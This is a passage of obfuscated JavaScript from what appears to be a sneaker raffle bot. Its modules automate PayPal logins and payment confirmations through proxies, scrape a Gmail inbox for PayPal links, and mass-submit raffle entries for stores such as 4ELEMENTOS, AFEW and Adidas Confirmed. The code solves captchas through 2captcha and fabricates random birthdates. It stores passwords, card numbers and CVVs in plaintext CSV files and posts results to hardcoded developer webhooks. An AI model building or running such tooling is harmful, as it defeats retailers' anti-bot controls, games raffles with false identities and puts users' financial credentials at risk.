    if (_0x18cfc6 != 'yes')
        var _0x18cfc6 = '', _0x2723fd = 0x0;
    async function _0x1582ee() {
        var _0xaf84c3 = _0x534d99['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x485510 = _0x4d3f8b['parse'](_0xaf84c3, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x5507ab = 0x0; _0x5507ab < _0x485510['length']; _0x5507ab++) {
            console['log']('(' + _0x5507ab + ')\x20' + _0x485510[_0x5507ab]['Email']);
        }
        console['log']('\x0a(' + _0x485510['length'] + ')\x20' + _0x31f5da['cyan']('Add\x20a\x20new\x20account'));
        let _0x389680 = await _0x402a5d['get']('Option');
        if (_0x389680['Option'] < _0x485510['length'])
            return _0x485510[_0x389680['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x78d329 = {}, _0x26dcb5 = await _0x402a5d['get']('Email');
        _0x78d329['Email'] = _0x26dcb5['Email'];
        var _0x34ec20 = Math['round'](Math['random']() * (_0x4c97e3['length'] - 0x1));
        _0x78d329['Proxy'] = _0x4c97e3[_0x34ec20], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x29ffca = await _0x402a5d['get']('Password');
        return _0x78d329['Password'] = _0x29ffca['Password'], _0x534d99['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x78d329['Email'] + ',' + _0x78d329['Password'] + ',' + _0x78d329['Proxy']), _0x78d329;
    }
    let _0x27f5f7 = await _0x1582ee();
    var _0x17902f = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x49c865 = await _0x402a5d['get']('Amount'), _0x370692 = _0x49c865['Amount'];
    async function _0x74d95() {
        let _0x58cf24 = 0x0;
        var _0xf50917 = new _0x48412a({
            'user': _0x4558f2['masterMail'],
            'password': _0x4558f2['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x219b4d(_0x4e7418) {
            _0xf50917['openBox']('INBOX', ![], _0x4e7418);
        }
        _0xf50917['once']('ready', function () {
            _0x219b4d(function (_0x1ad324, _0x45fb09) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x1ad324)
                    throw _0x1ad324;
                _0xf50917['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x545b80, _0x2a1b28) {
                    if (!_0x2a1b28 || !_0x2a1b28['length'])
                        console['log'](_0x1a8584() + '\x20[' + _0x930264 + ']\x20No\x20mails\x20found'), _0xf50917['end']();
                    else {
                        _0x2a1b28 = _0x2a1b28['slice'](0x0, _0x370692);
                        var _0x3ca661 = _0xf50917['seq']['fetch'](_0x2a1b28, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x3ca661['on']('message', function (_0x44d860, _0x451111) {
                            var _0x2ebcb7 = '(#' + _0x451111 + ')\x20';
                            _0x44d860['on']('body', function (_0x3c61b1, _0x438b1d) {
                                _0x1560b8(_0x3c61b1, (_0x41da55, _0x4cab62) => {
                                    if (_0x4cab62['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x4cab62['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x4cab62['text']['split']('[')[0x2];
                                        var _0xb673e7 = mes['split'](']')[0x0];
                                        _0x17902f['push'](_0xb673e7);
                                    }
                                });
                            }), _0x44d860['once']('end', function () {
                                _0x58cf24++;
                            });
                        }), _0x3ca661['once']('error', function (_0x1a5e03) {
                            console['log']('Fetch\x20error:\x20' + _0x1a5e03);
                        }), _0x3ca661['once']('end', function () {
                            _0xf50917['end']();
                        });
                    }
                });
            });
        }), _0xf50917['once']('error', function (_0x1d2c8b) {
            console['log'](_0x31f5da['red'](_0x1d2c8b['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0xf50917['once']('end', async function () {
        }), _0xf50917['connect']();
    }
    try {
        _0x74d95(), await _0x1e21d2(0xfa0), console['log']('Found\x20' + _0x17902f['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x1e21d2(0xfa0);
    }
    var _0x2cd2ef;
    _0x4a5c1f('' + _0x930264);
    var _0x1de059 = _0x27f5f7['Proxy']['split'](':'), _0x35cabf;
    try {
        _0x35cabf = await _0x16ed0a['launch']({
            'userDataDir': 'sessions/' + _0x27f5f7['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x1de059[0x0] + ':' + _0x1de059[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x35cabf = await _0x16ed0a['launch']({
            'userDataDir': 'sessions/' + _0x27f5f7['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x1de059[0x0] + ':' + _0x1de059[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x1a8584() + '\x20[' + _0x930264 + ']\x20Getting\x20Session');
        const _0x53d7e5 = await _0x35cabf['newPage']();
        await _0x53d7e5['authenticate']({
            'username': '' + _0x1de059[0x2],
            'password': '' + _0x1de059[0x3]
        }), await _0x53d7e5['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x53d7e5['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x1a8584() + '\x20[' + _0x930264 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x53d7e5['waitForSelector']('#email');
            let _0x545abe = await _0x53d7e5['$eval']('#email', _0x3f71d1 => _0x3f71d1['getAttribute']('value'));
            if (_0x545abe == '') {
                await _0x53d7e5['type']('#email', _0x27f5f7['Email']), await _0x1e21d2(0x1d3);
                let _0x5515b3 = await _0x53d7e5['$']('#splitPassword');
                _0x5515b3 && (await _0x53d7e5['click']('#btnNext'), await _0x1e21d2(0xa28)), await _0x53d7e5['type']('#password', _0x27f5f7['Password']), await _0x1e21d2(0x35c), await _0x53d7e5['click']('#btnLogin');
            } else
                await _0x53d7e5['type']('#password', _0x27f5f7['Password']), await _0x1e21d2(0x35c), await _0x53d7e5['click']('#btnLogin');
            await _0x53d7e5['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x1a8584() + '\x20[' + _0x930264 + ']\x20Successfully\x20logged\x20in'), await _0x1e21d2(0x2710);
        } catch (_0xa6b1fb) {
            throw new Error('Login\x20session\x20expired\x20' + _0xa6b1fb);
        }
        for (var _0x339114 = 0x0; _0x339114 < _0x17902f['length']; _0x339114++) {
            console['log'](_0x1a8584() + '\x20[' + _0x930264 + ']\x20Task\x20' + (_0x339114 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x4a5c1f(_0x930264 + '\x20Task\x20' + (_0x339114 + 0x1) + '\x20/\x20' + _0x17902f['length']);
            const _0x5aad74 = await _0x35cabf['newPage']();
            await _0x5aad74['goto']('' + _0x17902f[_0x339114], { 'waitUntil': 'networkidle2' }), await _0x1e21d2(0xbb8);
            try {
                const _0x208232 = await _0x5aad74['$']('#challenge-heading');
                _0x208232 && (console['log'](_0x1a8584() + '\x20[' + _0x930264 + ']\x20Task\x20' + (_0x339114 + 0x1) + '\x20:\x20' + _0x31f5da['yellow']('2FA\x20Required')), await _0x5aad74['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x1e21d2(0x9c40), await _0x5aad74['waitForSelector']('#payment-submit-btn'), await _0x5aad74['$eval']('#payment-submit-btn', _0x48684d => _0x48684d['click']()), await _0x5aad74['click']('#payment-submit-btn');
                try {
                    await _0x5aad74['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x1e21d2(0x5dc), console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0x930264 + ']\x20Task\x20' + (_0x339114 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x2e7748) {
                    _0x18cfc6 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x2e7748['message']);
                } finally {
                    if (_0x18cfc6 == 'yes' && _0x2723fd != 0x2) {
                        console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x930264['name'] + ']\x20Task\x20' + (_0x339114 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2723fd + '\x20/\x205)')), _0x339114 = _0x339114 - 0x1, _0x2723fd = _0x2723fd + 0x1;
                        continue;
                    }
                    _0x18cfc6 == 'yes' && _0x2723fd >= 0x2 && (_0x456859(csv[_0x339114], _0x930264), _0x18cfc6 = 'no', _0x2723fd = 0x0), await _0x5aad74['close'](), await _0x1e21d2(0x4650);
                }
            } catch (_0x39e176) {
                console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0x930264 + ']\x20Task\x20' + (_0x339114 + 0x1) + '\x20:\x20' + _0x39e176));
            }
        }
    } catch (_0x271bf8) {
        console['log'](_0x31f5da['red']('' + _0x271bf8));
    } finally {
        await _0x35cabf['close']();
    }
}
const _0x5f2e49 = [
    {
        'name': '4ELEMENTOS',
        'modules': [{
            'name': '4ELEMENTOS\x20Raffle\x20Entries',
            'store': '4ELEMENTOS',
            'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
            'function': async function (_0xf8eda8, _0x4a2cf9, _0x58379c) {
                _0x16ed0a['use'](_0x27f782()), _0x16ed0a['use'](_0x3d4bba({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4558f2['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5ca56b = 0x0; _0x5ca56b < _0x4a2cf9['length']; _0x5ca56b++) {
                    if (_0x51e7c0 != 'yes')
                        var _0x51e7c0 = '', _0x2d1046 = 0x0;
                    var _0x4426a0;
                    try {
                        await _0x437e8(_0x4a2cf9, _0x5ca56b);
                    } catch {
                        _0x51e7c0 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    _0x4a5c1f(_0xf8eda8['name'] + '\x20Task\x20' + (_0x5ca56b + 0x1) + '\x20/\x20' + _0x4a2cf9['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                    var _0x207a53 = [
                        '40',
                        '40,5',
                        '41',
                        '42',
                        '42,5',
                        '43',
                        '44',
                        '45',
                        '45,5',
                        '46',
                        '47',
                        '47,5',
                        '48'
                    ], _0x41a1ee = Math['round'](Math['random']() * (_0x207a53['length'] - 0x1));
                    _0x4a2cf9[_0x5ca56b]['Size'] == 'RANDOM' && (_0x4a2cf9[_0x5ca56b]['Size'] = _0x207a53[_0x41a1ee]);
                    var _0x3bc84c = Math['round'](Math['random']() * (_0x58379c['length'] - 0x1)), _0x1877b0 = _0x58379c[_0x3bc84c]['split'](':'), _0x24af70;
                    try {
                        _0x24af70 = await _0x16ed0a['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1877b0[0x0] + ':' + _0x1877b0[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x24af70 = await _0x16ed0a['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1877b0[0x0] + ':' + _0x1877b0[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        console['log'](_0x1a8584() + '\x20[' + _0xf8eda8['name'] + ']\x20Task\x20' + (_0x5ca56b + 0x1) + '\x20:\x20Getting\x20Session');
                        const _0x298002 = await _0x24af70['newPage']();
                        await _0x298002['authenticate']({
                            'username': '' + _0x1877b0[0x2],
                            'password': '' + _0x1877b0[0x3]
                        }), await _0x298002['setRequestInterception'](!![]), _0x298002['on']('request', _0x37d449 => {
                            _0x37d449['resourceType']() === 'image' || _0x37d449['resourceType']() === 'font' || _0x37d449['resourceType']() === 'media' ? _0x37d449['abort']() : _0x37d449['continue']();
                        }), await _0x298002['goto'](_0x4a2cf9[_0x5ca56b]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1a8584() + '\x20[' + _0xf8eda8['name'] + ']\x20Task\x20' + (_0x5ca56b + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x1e21d2(0x3e8), await _0x298002['waitForSelector']('#accept-all-gdpr'), await _0x298002['click']('#accept-all-gdpr'), await _0x298002['waitForSelector']('#main\x20>\x20div.product-container\x20>\x20div.col-lg-4.col-sm-12.sticky-right\x20>\x20div\x20>\x20div.cn_content.cn_content_type_inline\x20>\x20form\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20div\x20>\x20button'), await _0x1e21d2(0xbb8);
                        let _0x38cf4b = await _0x298002['$$']('button');
                        for (button of _0x38cf4b) {
                            let _0x126f9d = await _0x298002['evaluate'](_0x7b3efd => _0x7b3efd['innerHTML'], button);
                            if (_0x126f9d['toLowerCase']()['includes']('ntame')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x1e21d2(0x1388), await _0x298002['waitForSelector']('.cn_content_type_full-screen'), console['log'](_0x1a8584() + '\x20[' + _0xf8eda8['name'] + ']\x20Task\x20' + (_0x5ca56b + 0x1) + '\x20:\x20Checking\x20Information'), await _0x1e21d2(0x3e8);
                        let _0x1facf5 = await _0x298002['$$']('input[name=\x22email\x22]');
                        await _0x1facf5[0x1]['click'](), await _0x1e21d2(0x12c), await _0x298002['keyboard']['type'](_0x4a2cf9[_0x5ca56b]['Email']), await _0x1e21d2(0x1c2), await _0x298002['type']('input[name=\x22Nombre\x22]', _0x4a2cf9[_0x5ca56b]['FirstName'] + '\x20' + _0x4a2cf9[_0x5ca56b]['LastName']), await _0x1e21d2(0x1c2), await _0x298002['type']('input[name=\x22Direccion\x22]', _0x4a2cf9[_0x5ca56b]['Address1'] + '\x20' + _0x4a2cf9[_0x5ca56b]['HouseNumber'] + '\x20' + _0x4a2cf9[_0x5ca56b]['Address2']), await _0x1e21d2(0x1c2), await _0x298002['type']('input[name=\x22Ciudad\x22]', _0x4a2cf9[_0x5ca56b]['City']), await _0x1e21d2(0x1c2), await _0x298002['type']('input[name=\x22Provincia\x22]', _0x4a2cf9[_0x5ca56b]['State']), await _0x1e21d2(0x1c2), await _0x298002['type']('input[name=\x22CP\x22]', _0x4a2cf9[_0x5ca56b]['Zip']), await _0x1e21d2(0x1c2), await _0x298002['select']('select[name=\x22Pais\x22]', _0x4a2cf9[_0x5ca56b]['Country']), await _0x1e21d2(0x1c2), await _0x298002['type']('input[name=\x22Telefono\x22]', _0x4a2cf9[_0x5ca56b]['Phone']), await _0x1e21d2(0x1c2), await _0x298002['type']('input[name=\x22cumple\x22]', _0x54ffea(0x1, 0x14) + '-' + _0x54ffea(0x1, 0xb) + '-' + _0x54ffea(0x7c6, 0x7d0), { 'delay': 0x96 }), await _0x1e21d2(0x1c2), await _0x298002['type']('input[name=\x22Instagram\x22]', _0x4a2cf9[_0x5ca56b]['Follower']), await _0x1e21d2(0x1c2), await _0x298002['type']('input[name=\x22Talla\x22]', _0x4a2cf9[_0x5ca56b]['Size']), await _0x1e21d2(0x1f4), await _0x298002['click']('#sexo_hombre'), await _0x1e21d2(0x1f4), await _0x298002['click']('#idioma_ingles'), await _0x1e21d2(0x1f4), await _0x298002['click']('#privacidad_si'), await _0x1e21d2(0x1f4), await _0x298002['click']('#acepta_suscripcion_si'), await _0x1e21d2(0x1f4), console['log'](_0x1a8584() + '\x20[' + _0xf8eda8['name'] + ']\x20Task\x20' + (_0x5ca56b + 0x1) + '\x20:\x20Sending\x20Request');
                        let _0x44b9df = await _0x298002['$$']('button');
                        for (button of _0x44b9df) {
                            let _0x3d6ada = await _0x298002['evaluate'](_0x54a6b4 => _0x54a6b4['innerHTML'], button);
                            if (_0x3d6ada['toLowerCase']()['includes']('send')) {
                                console['log']('click'), await button['click']();
                                break;
                            }
                        }
                        await _0x1e21d2(0x1388), console['log'](_0x31f5da['green'](_0x1a8584() + '\x20[' + _0xf8eda8['name'] + ']\x20Task\x20' + (_0x5ca56b + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x51e7c0 = '';
                        var _0x7dd549 = await _0x3d56af(_0x4a2cf9[_0x5ca56b], _0xf8eda8, 'dev', ![]), _0x4c9007 = await _0x3d56af(_0x4a2cf9[_0x5ca56b], _0xf8eda8, 'pub', ![]);
                        const _0x3f4d64 = {
                            'succesDEVMSG': { 'embeds': [_0x7dd549] },
                            'succesPUBMSG': { 'embeds': [_0x4c9007] }
                        };
                        try {
                            _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x3f4d64['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x258e47, _0x3f4d64['succesDEVMSG']), await _0x1e21d2(0xc8), await _0xa0452b(_0x28ff05, _0x3f4d64['succesPUBMSG']);
                        } catch (_0x293e59) {
                            console['log'](_0x31f5da['yellow'](_0x1a8584() + '\x20[' + _0xf8eda8['name'] + ']\x20Task\x20' + (_0x5ca56b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x293e59));
                        }
                    } catch (_0x53edd8) {
                        console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0xf8eda8['name'] + ']\x20Task\x20' + (_0x5ca56b + 0x1) + '\x20:\x20' + _0x53edd8)), _0x4426a0 = '' + _0x53edd8;
                        var _0x316db0 = await _0x3d56af(_0x4a2cf9[_0x5ca56b], _0xf8eda8, 'dev', !![], _0x4426a0), _0x7dd549 = await _0x3d56af(_0x4a2cf9[_0x5ca56b], _0xf8eda8, 'dev', ![]), _0x4c9007 = await _0x3d56af(_0x4a2cf9[_0x5ca56b], _0xf8eda8, 'pub', ![]);
                        const _0x47614c = {
                            'succesDEVMSG': { 'embeds': [_0x7dd549] },
                            'succesPUBMSG': { 'embeds': [_0x4c9007] }
                        };
                        _0x47614c['errorDEV'] = { 'embeds': [_0x316db0] }, _0x4558f2['webhook'] != undefined && _0x4558f2['webhook'] != '' && await _0xa0452b(_0x4558f2['webhook'], _0x47614c['errorDEV']), await _0xa0452b(_0x5522d1, _0x47614c['errorDEV']), _0x53edd8 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x51e7c0 = 'yes');
                    } finally {
                        _0x24af70['close']();
                        if (_0x51e7c0 == 'yes' && _0x2d1046 != 0x5 && _0x4426a0 != 'Size\x20Not\x20Found') {
                            console['log'](_0x31f5da['red'](_0x1a8584() + '\x20[' + _0xf8eda8['name'] + ']\x20Task\x20' + (_0x5ca56b + 0x1) + '\x20:\x20Retrying\x20(' + _0x2d1046 + '\x20/\x205)\x20')), _0x5ca56b = _0x5ca56b - 0x1, _0x2d1046 = _0x2d1046 + 0x1;
                            continue;
                        }
                        _0x51e7c0 == 'yes' && _0x2d1046 >= 0x5 && (_0x456859(_0x4a2cf9[_0x5ca56b], _0xf8eda8), _0x51e7c0 = 'no', _0x2d1046 = 0x0), console['log'](_0x1a8584() + '\x20[' + _0xf8eda8['name'] + ']\x20Waiting\x20for\x20' + _0x4558f2['delay'] + '\x20ms'), await _0x1e21d2(_0x4558f2['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'ADIDAS\x20CONFIRMED',
        'modules': [
            {
                'name': 'CONFIRMED\x20Account\x20Generator',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x26dbc0, _0x19ce21) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..'), _0x534d99['writeFileSync']('proxies.txt', '');
                    for (proxy in _0x19ce21) {
                        _0x534d99['appendFileSync']('proxies.txt', _0x19ce21[proxy] + '\x0a');
                    }
                    for (var _0x1bff8b = 0x0; _0x1bff8b < _0x26dbc0['length']; _0x1bff8b++) {
                        await _0x437e8(_0x26dbc0, _0x1bff8b), _0x534d99['appendFileSync']('tasks.csv', '\x0a' + _0x26dbc0[_0x1bff8b]['Url'] + ',' + _0x26dbc0[_0x1bff8b]['Size'] + ',' + _0x26dbc0[_0x1bff8b]['Email'] + ',' + _0x26dbc0[_0x1bff8b]['Password'] + ',' + _0x26dbc0[_0x1bff8b]['FirstName'] + ',' + _0x26dbc0[_0x1bff8b]['LastName'] + ',' + _0x26dbc0[_0x1bff8b]['Address1'] + ',' + _0x26dbc0[_0x1bff8b]['Address2'] + ',' + _0x26dbc0[_0x1bff8b]['HouseNumber'] + ',' + _0x26dbc0[_0x1bff8b]['Zip'] + ',' + _0x26dbc0[_0x1bff8b]['City'] + ',' + _0x26dbc0[_0x1bff8b]['Country'] + ',' + _0x26dbc0[_0x1bff8b]['State'] + ',' + _0x26dbc0[_0x1bff8b]['CardNumber'] + ',' + _0x26dbc0[_0x1bff8b]['ExpiryDate'] + ',' + _0x26dbc0[_0x1bff8b]['CVV'] + ',' + _0x26dbc0[_0x1bff8b]['NameOnCard'] + ',' + _0x26dbc0[_0x1bff8b]['Phone'] + ',' + _0x26dbc0[_0x1bff8b]['Follower']);
                    }
                    await _0x1e21d2(0x3e8), _0x1aeda3('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/tempgen.py'
                    ], { 'shell': !![] });
                }
            },
            {
                'name': 'CONFIRMED\x20Info\x20Adder',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x3d2fb0, _0x466c91) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..');
                    for (var _0x2c22dc = 0x0; _0x2c22dc < _0x3d2fb0['length']; _0x2c22dc++) {
                        await _0x437e8(_0x3d2fb0, _0x2c22dc), _0x534d99['appendFileSync']('tasks.csv', '\x0a' + _0x3d2fb0[_0x2c22dc]['Url'] + ',' + _0x3d2fb0[_0x2c22dc]['Size'] + ',' + _0x3d2fb0[_0x2c22dc]['Email'] + ',' + _0x3d2fb0[_0x2c22dc]['Password'] + ',' + _0x3d2fb0[_0x2c22dc]['FirstName'] + ',' + _0x3d2fb0[_0x2c22dc]['LastName'] + ',' + _0x3d2fb0[_0x2c22dc]['Address1'] + ',' + _0x3d2fb0[_0x2c22dc]['Address2'] + ',' + _0x3d2fb0[_0x2c22dc]['HouseNumber'] + ',' + _0x3d2fb0[_0x2c22dc]['Zip'] + ',' + _0x3d2fb0[_0x2c22dc]['City'] + ',' + _0x3d2fb0[_0x2c22dc]['Country'] + ',' + _0x3d2fb0[_0x2c22dc]['State'] + ',' + _0x3d2fb0[_0x2c22dc]['CardNumber'] + ',' + _0x3d2fb0[_0x2c22dc]['ExpiryDate'] + ',' + _0x3d2fb0[_0x2c22dc]['CVV'] + ',' + _0x3d2fb0[_0x2c22dc]['NameOnCard'] + ',' + _0x3d2fb0[_0x2c22dc]['Phone'] + ',' + _0x3d2fb0[_0x2c22dc]['Follower']);
                    }
                    await _0x1e21d2(0x3e8), _0x1aeda3('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/tempadd.py'
                    ], { 'shell': !![] });
                }
            },
            {
                'name': 'CONFIRMED\x20Entries',
                'store': 'ADIDAS\x20CONFIRMED',
                'logo': 'https://p1.hiclipart.com/preview/328/72/32/light-dock-icons-adidas-adidas-logo-png-clipart.jpg',
                'function': async function (_0x4dc887, _0x6e0669) {
                    console['clear'](), console['log']('Preparing\x20CONFIRMED\x20Tasks..'), _0x534d99['writeFileSync']('proxies.txt', '');
                    for (proxy in _0x6e0669) {
                        _0x534d99['appendFileSync']('proxies.txt', _0x6e0669[proxy] + '\x0a');
                    }
                    for (var _0xd19712 = 0x0; _0xd19712 < _0x4dc887['length']; _0xd19712++) {
                        await _0x437e8(_0x4dc887, _0xd19712), _0x534d99['appendFileSync']('tasks.csv', '\x0a' + _0x4dc887[_0xd19712]['Url'] + ',' + _0x4dc887[_0xd19712]['Size'] + ',' + _0x4dc887[_0xd19712]['Email'] + ',' + _0x4dc887[_0xd19712]['Password'] + ',' + _0x4dc887[_0xd19712]['FirstName'] + ',' + _0x4dc887[_0xd19712]['LastName'] + ',' + _0x4dc887[_0xd19712]['Address1'] + ',' + _0x4dc887[_0xd19712]['Address2'] + ',' + _0x4dc887[_0xd19712]['HouseNumber'] + ',' + _0x4dc887[_0xd19712]['Zip'] + ',' + _0x4dc887[_0xd19712]['City'] + ',' + _0x4dc887[_0xd19712]['Country'] + ',' + _0x4dc887[_0xd19712]['State'] + ',' + _0x4dc887[_0xd19712]['CardNumber'] + ',' + _0x4dc887[_0xd19712]['ExpiryDate'] + ',' + _0x4dc887[_0xd19712]['CVV'] + ',' + _0x4dc887[_0xd19712]['NameOnCard'] + ',' + _0x4dc887[_0xd19712]['Phone'] + ',' + _0x4dc887[_0xd19712]['Follower']);
                    }
                    await _0x1e21d2(0x3e8), _0x1aeda3('start', [
                        'cmd',
                        '/k',
                        'py\x20modules/Confirmed/sensor.py'
                    ], { 'shell': !![] });
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0xf858b2, _0x31ae25, _0x325060) {
                for (var _0x2435c1 = 0x0; _0x2435c1 < _0x31ae25['length']; _0x2435c1++) {
                    _0x4558f2['AfewDelay'] = _0x4558f2['delay'];
                    var _0x321ed2;
                    if (_0x52a7e2 != 'yes')
                        var _0x52a7e2 = '', _0x1b2aec = 0x0;
                    var _0x492957 = _0x31ae25[_0x2435c1]['Url'], _0x3a484a = _0x31ae25[_0x2435c1];
                    _0x4a5c1f(_0xf858b2['name'] + '\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20/\x20' + _0x31ae25['length'] + '\x20||\x20File:\x20' + _0x231d1f + '\x20Proxies:\x20' + _0x124a40);
                    try {
                        await _0x437e8(_0x31ae25, _0x2435c1);
                    } catch {
                        _0x52a7e2 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x2e294c(_0x325af6) {
                        const _0x306ccc = _0x534d99['readFileSync']('../successful-tasks.csv', 'utf8'), _0x39dfc8 = _0x4d3f8b['parse'](_0x306ccc, { 'header': !![] })['data'];
                        let _0x546737 = ![];
                        for (var _0x5e90a8 of _0x39dfc8) {
                            if (_0x5e90a8['Url'] == _0x325af6['Url'] && _0x5e90a8['Email'] == _0x325af6['Email']) {
                                _0x546737 = !![];
                                break;
                            }
                        }
                        return _0x546737;
                    }
                    if (await _0x2e294c(_0x31ae25[_0x2435c1]) == !![]) {
                        console['log'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x145168 = await _0x3d56af(_0x31ae25[_0x2435c1], _0xf858b2, 'dev', ![]), _0x21e6a7 = await _0x3d56af(_0x31ae25[_0x2435c1], _0xf858b2, 'pub', ![]);
                    const _0x44009c = {
                        'succesDEVMSG': { 'embeds': [_0x145168] },
                        'succesPUBMSG': { 'embeds': [_0x21e6a7] }
                    };
                    if (_0x31ae25[_0x2435c1]['Email'] == '' || _0x31ae25[_0x2435c1]['FirstName'] == '' || _0x31ae25[_0x2435c1]['LastName'] == '' || _0x31ae25[_0x2435c1]['Country'] == '' || _0x31ae25[_0x2435c1]['Size'] == '' || _0x31ae25[_0x2435c1]['Address1'] == '' || _0x31ae25[_0x2435c1]['Zip'] == '') {
                        console['log'](_0x1a8584() + '\x20[' + _0xf858b2['name'] + ']\x20Task\x20' + (_0x2435c1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    _0x31ae25[_0x2435c1]['Country']['length'] == 0x2 && (_0x31ae25[_0x2435c1]['Country'] = _0x63105a[_0x31ae25[_0x2435c1]['Country']]);
                    if (_0x4558f2['useRandomProxy'] = ![])
                        var _0x146e8e = _0x325060[_0x2435c1]['split'](':');
                    else
                        var _0x5628fb = Math['round'](Math['random']() * (_0x325060['length'] - 0x1)), _0x146e8e = _0x325060[_0x5628fb]['split'](':');
                    var _0x1082ff;
                    try {
                        _0x1082ff = await _0x16ed0a['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x146e8e[0x0] + ':' + _0x146e8e[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x1082ff = await _0x16ed0a['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
